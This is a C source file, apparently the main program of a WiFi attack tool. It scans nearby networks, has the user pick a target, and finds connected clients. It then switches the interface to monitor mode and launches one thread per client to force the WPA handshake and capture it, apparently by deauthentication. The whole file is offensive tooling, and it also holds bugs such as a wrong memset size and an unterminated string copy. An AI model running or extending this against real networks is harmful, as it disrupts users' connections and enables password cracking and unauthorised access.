#include <stdio.h>
#include "./network_scanner/scanner.h"
#include "./menu/menu.h"

#include "deauth/deauth.h"
#include "wifi/wifi.h"

#include "handshake/handshake.h"

#include "station/station.h"
#include "target_client/target.h"

struct args {
    char* iface;
    int freq;
    byte station[6];
    byte bssid[6];
    struct response_chunk_ll* chunk;
    char* ended;
};


void* aim_on_threaded(void* args) {
    struct args* a = (struct args*)args;
    char* iface = a->iface;
    int freq = a->freq;
    aim_on(iface,freq,a->station,a->bssid,a->chunk,a->ended);
}

int main() {
    char* iface = "IFACE";
    title();
    YELLOW();
    printf("Wifi scan is running...\n");
    struct wifi_network* networks = wifi_scan(iface);
    struct wifi_network* network = menu(networks);

    YELLOW();
    printf("doing a station scan...\n");
    struct station* station = find_station(iface,network->freq,network->ap_hwaddr);
    struct station* tmp = station;
    //sniff_handshake("wlo1",network->freq,station,network->ap_hwaddr);

    iface_toogle(iface,0);
    toggle_monitor(iface,1);
    iface_toogle(iface,1);
    channel_switch(iface,network->freq);
    CYAN();
    printf("trying to get an handshake...\n");

    struct response_chunk_ll* chunk = (struct response_chunk_ll*)malloc(sizeof(struct response_chunk_ll));
    memset(chunk,0,sizeof(chunk));

    char ended_identifier = 0;

    byte z[6] = {0,0,0,0,0,0};
    if(!memcmp(station->mac,z,6)) {
        RED();
        printf("Sorry, couldnt find any station...\n");
        WHITE();
        return 0;
    }


    while(tmp != NULL) {
       // aim_on("wlo1",network->freq,station,network->ap_hwaddr);
        struct args* a = (struct args*)malloc(sizeof(struct args));
        a->ended = &ended_identifier;
        a->iface = malloc(strlen(iface));
        memcpy(a->iface,iface,strlen(iface));
        a->freq = network->freq;
        memcpy(a->bssid,network->ap_hwaddr,6);
        memcpy(a->station,tmp->mac,6);
        a->chunk = chunk;
        pthread_t thread;
        if(pthread_create(&thread,NULL,aim_on_threaded,a) != 0) {
            printf("Thread error\n");
        }


        tmp = tmp->next;
    }

    while(!ended_identifier){}


    deep_free(networks);
    deep_station_free(station);


    iface_toogle(iface,0);
    toggle_monitor(iface,0);
    iface_toogle(iface,1);

    

    return 0;
    
}